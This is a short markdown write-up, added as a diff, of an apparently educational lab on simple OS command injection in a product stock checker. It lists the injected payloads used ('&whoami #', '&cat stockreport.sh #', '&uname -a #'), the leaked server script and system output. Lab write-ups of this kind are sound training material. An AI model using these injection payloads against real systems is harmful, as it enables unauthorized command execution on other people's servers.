@@ -1,0 +1,31 @@
+# OS command injections simple case
+
+## Task
+ This lab contains an OS command injection vulnerability in the product stock checker.
+
+The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
+
+To solve the lab, execute the whoami command to determine the name of the current user. 
+
+
+
+
+
+analysis:
+	- execute the whoami command in stock checker field.
+
+
+
+
+## Exploited via the following commands
+
+	 &ls -la; pwd #
+	 &whoami #
+	 &cat stockreport.sh #
+
+	 		#!/bin/bash
+			set -eu
+			eval cksum <<< "$1 $2" | cut -c 2-3 | rev | sed s/0/1/
+
+	&uname -a #
+			 Linux b5d1abef2548 4.14.254-212.502.amzn2.x86_64 #1 SMP Thu May 26 09:52:17 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux units 
